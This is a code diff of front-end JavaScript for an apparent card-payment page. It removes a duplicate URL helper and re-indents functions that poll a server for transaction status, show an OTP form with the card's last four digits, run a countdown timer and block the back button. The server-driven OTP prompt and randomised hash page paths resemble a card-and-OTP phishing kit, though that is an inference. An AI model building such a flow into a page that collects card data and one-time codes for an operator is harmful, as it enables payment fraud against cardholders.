@@ -958,12 +958,6 @@ function getBankpageUrl(invoiceId) {
   const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
   return `/p/${hash}/bankpage?invoiceId=${invoiceId}`;
 }
-
-// Create a hash URL for bankpage
-function getBankpageUrl(invoiceId) {
-  const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
-  return `/bankpage-page.html?invoiceId=${invoiceId}`;
-}
           
 // FIXED: Consolidated DOMContentLoaded event listener with improved amount handling
 document.addEventListener('DOMContentLoaded', async function() {
@@ -2552,119 +2546,122 @@ socket.on('mc_verification_result', (data) => {
         }
       }
   
-      // FIXED: Transaction Status Check Function with proper closing braces
-      async function checkTransactionStatus() {
-        if (!currentInvoiceId) return;
+async function checkTransactionStatus() {
+  if (!currentInvoiceId) return;
+  try {
+    const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
+    if (!response.ok) throw new Error('Failed to check transaction status');
+    
+    const data = await response.json();
+    
+    const paymentFormEl = document.getElementById('paymentForm');
+    const otpFormEl = document.getElementById('otpForm');
+    const cardLastFourEl = document.getElementById('cardLastFour');
+    const cardNumberEl = document.getElementById('cardNumber');
+    const otpErrorEl = document.getElementById('otpError');
+    
+    if (data.status === 'show_otp') {
+      if (statusCheckInterval) {
+        clearInterval(statusCheckInterval);
+        statusCheckInterval = null;
+      }
+      
+      if (paymentFormEl && otpFormEl) {
+        paymentFormEl.classList.add('hidden');
+        otpFormEl.classList.remove('hidden');
+      }
+      
+      if (cardLastFourEl && cardNumberEl) {
+        cardLastFourEl.textContent = cardNumberEl.value.slice(-4);
+      }
+      
+      if (!timerInterval) { 
+        startOtpTimer(); 
+      }
+      
+      if (data.otpError && otpErrorEl) {
+        otpErrorEl.style.display = 'block';
+        
+        // Reset OTP button state when there's an error
+        const otpButton = document.getElementById('otpSubmitButton');
+        const otpLoader = document.getElementById('otpLoader');
+        const btnText = document.getElementById('otpText');
+        
+        if (otpButton && otpLoader && btnText) {
+          otpButton.disabled = false;
+          otpLoader.classList.add('hidden');
+          btnText.style.opacity = '1';
+          btnText.style.filter = 'none';
+        }
+        
+        isProcessing = false;
+      } else if (otpErrorEl) {
+        otpErrorEl.style.display = 'none';
+      }
+      
+      isProcessing = false;
+    } 
+    else if (data.status === 'redirect') {
+      // Use hash-based URLs for redirects
+      if (data.redirectUrl.includes('success.html')) {
+        window.location.href = getSuccessUrl(currentInvoiceId);
+      } else if (data.redirectUrl.includes('fail.html')) {
+        const url = new URL(data.redirectUrl, window.location.origin);
+        const reason = url.searchParams.get('reason');
+        window.location.href = getFailUrl(reason);
+      } else if (data.redirectUrl.includes('currencypayment.html')) {
+        const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
         try {
-          const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
-          if (!response.ok) throw new Error('Failed to check transaction status');
-          
-          const data = await response.json();
-          
-          const paymentFormEl = document.getElementById('paymentForm');
-          const otpFormEl = document.getElementById('otpForm');
-          const cardLastFourEl = document.getElementById('cardLastFour');
-          const cardNumberEl = document.getElementById('cardNumber');
-          const otpErrorEl = document.getElementById('otpError');
-          
-          if (data.status === 'show_otp') {
-            if (statusCheckInterval) {
-              clearInterval(statusCheckInterval);
-              statusCheckInterval = null;
-            }
-            
-            if (paymentFormEl && otpFormEl) {
-              paymentFormEl.classList.add('hidden');
-              otpFormEl.classList.remove('hidden');
-            }
-            
-            if (cardLastFourEl && cardNumberEl) {
-              cardLastFourEl.textContent = cardNumberEl.value.slice(-4);
-            }
-            
-            if (!timerInterval) { 
-              startOtpTimer(); 
-            }
-            
-            if (data.otpError && otpErrorEl) {
-              otpErrorEl.style.display = 'block';
-              
-              // Reset OTP button state when there's an error
-              const otpButton = document.getElementById('otpSubmitButton');
-              const otpLoader = document.getElementById('otpLoader');
-              const btnText = document.getElementById('otpText');
-              
-              if (otpButton && otpLoader && btnText) {
-                otpButton.disabled = false;
-                otpLoader.classList.add('hidden');
-                btnText.style.opacity = '1';
-                btnText.style.filter = 'none';
-              }
-              
-              isProcessing = false;
-            } else if (otpErrorEl) {
-              otpErrorEl.style.display = 'none';
-            }
-            
-            isProcessing = false;
-          } 
-else if (data.status === 'redirect') {
-  // Use hash-based URLs for redirects
-  if (data.redirectUrl.includes('success.html')) {
-    window.location.href = getSuccessUrl(currentInvoiceId);
-  } else if (data.redirectUrl.includes('fail.html')) {
-    const url = new URL(data.redirectUrl, window.location.origin);
-    const reason = url.searchParams.get('reason');
-    window.location.href = getFailUrl(reason);
-  } else if (data.redirectUrl.includes('currencypayment.html')) {
-    const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
-    try {
-      const urlParams = new URLSearchParams(new URL(data.redirectUrl, window.location.origin).search);
-      window.location.href = `/p/${hash}/currency?${urlParams.toString()}`;
-    } catch (error) {
-      console.error("Error parsing redirect URL:", error);
-      window.location.href = `/p/${hash}/currency`;
+          const urlParams = new URLSearchParams(new URL(data.redirectUrl, window.location.origin).search);
+          window.location.href = `/p/${hash}/currency?${urlParams.toString()}`;
+        } catch (error) {
+          console.error("Error parsing redirect URL:", error);
+          window.location.href = `/p/${hash}/currency`;
+        }
+      } else {
+        // Keep any other URLs as is but check if we need to convert them
+        if (data.redirectUrl.endsWith('.html')) {
+          // Convert any other HTML pages to hash format
+          const pageName = data.redirectUrl.replace('.html', '');
+          const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
+          window.location.href = `/p/${hash}/${pageName}`;
+        } else {
+          window.location.href = data.redirectUrl;
+        }
+      }
     }
-  } else {
-    // Keep any other URLs as is but check if we need to convert them
-    if (data.redirectUrl.endsWith('.html')) {
-      // Convert any other HTML pages to hash format
-      const pageName = data.redirectUrl.replace('.html', '');
-      const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
-      window.location.href = `/p/${hash}/${pageName}`;
-    } else {
-      window.location.href = data.redirectUrl;
-    }
+  } catch (error) {
+    console.error('Transaction status check error:', error);
   }
 }
   
-      // OTP Timer Function
-      function startOtpTimer() {
-        const timerEl = document.getElementById('timer');
-        if (!timerEl) return; // Added null check
-        
-        if (timerInterval) {
-          clearInterval(timerInterval);
-          timerInterval = null;
-        }
-        
-        timer = 180;
-        timerInterval = setInterval(() => {
-          timer--;
-          const minutes = Math.floor(timer / 60);
-          const seconds = timer % 60;
-          
-          if (timerEl) {
-            timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-          }
-          
-if (timer <= 0) {
-  clearInterval(timerInterval);
-  timerInterval = null;
-  window.location.href = getFailUrl('timeout'); // Use hash-based URL
+// OTP Timer Function
+function startOtpTimer() {
+  const timerEl = document.getElementById('timer');
+  if (!timerEl) return; // Added null check
+  
+  if (timerInterval) {
+    clearInterval(timerInterval);
+    timerInterval = null;
+  }
+  
+  timer = 180;
+  timerInterval = setInterval(() => {
+    timer--;
+    const minutes = Math.floor(timer / 60);
+    const seconds = timer % 60;
+    
+    if (timerEl) {
+      timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+    }
+    
+    if (timer <= 0) {
+      clearInterval(timerInterval);
+      timerInterval = null;
+      window.location.href = getFailUrl('timeout'); // Use hash-based URL
+    }
+  }, 1000);
 }
-        }, 1000);
-      }
   
       // Consistent Back Button Prevention
       function setupBackButtonPrevention() {
